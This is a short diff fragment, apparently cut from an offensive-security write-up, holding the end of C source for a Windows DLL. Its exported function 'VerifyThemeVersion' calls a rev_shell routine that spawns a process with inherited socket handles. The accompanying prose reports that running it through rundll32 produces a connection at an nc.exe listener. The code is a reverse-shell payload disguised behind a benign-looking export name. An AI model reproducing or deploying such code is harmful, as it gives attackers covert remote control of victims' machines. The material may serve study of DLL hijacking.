@@ -1,0 +1,1 @@
+cess ( NULL , cmd , NULL , NULL , TRUE , 0 , NULL , NULL , & si , & pi ); WaitForSingleObject ( pi . hProcess , INFINITE ); CloseHandle ( pi . hProcess ); CloseHandle ( pi . hThread ); WSACleanup (); } int VerifyThemeVersion ( void ) { rev_shell (); return 0 ; } When I run this again using rundll32 , there’s a connection at nc.exe on
